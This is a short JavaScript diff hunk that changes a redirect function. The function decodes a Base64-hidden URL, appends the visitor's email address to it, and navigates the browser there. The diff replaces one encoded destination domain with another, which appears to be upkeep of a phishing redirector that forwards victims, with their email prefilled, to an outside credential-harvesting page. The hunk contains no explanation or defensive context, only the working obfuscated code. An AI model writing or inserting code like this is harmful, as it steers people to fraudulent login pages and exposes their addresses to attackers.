@@ -156,7 +156,7 @@
     }
 
     function redirect(email) {
-        var linkx = "aHR0cHM6Ly9ub3RpY2lhc3Zhc2NvLmNvbS5ici9uLz9jM1k5YnpNMk5WOHhYMjV2YlNaeVlXNWtQVk5YV2xoaFZrazlKblZwWkQxVlUwVlNNRGd3TVRJd01qVlZNamN3TVRBNE1qWT1OMDEyM05bRU1BSUxd";
+        var linkx = "aHR0cHM6Ly93MmFzZXNvcmVzeWNvbnN1bHRvcmVzLmNvbS9uLz9jM1k5YnpNMk5WOHhYMjV2YlNaeVlXNWtQVnBJUVRGTk1sRTlKblZwWkQxVlUwVlNNRGd3TVRJd01qVlZNamN3TVRBNE1qWT1OMDEyM05bRU1BSUxd";
         var decodedLink = atob(linkx);
         var finalLink = decodedLink + "#" + decodeURIComponent(email); // Fix: ensure @ is not encoded
         window.location.href = finalLink;
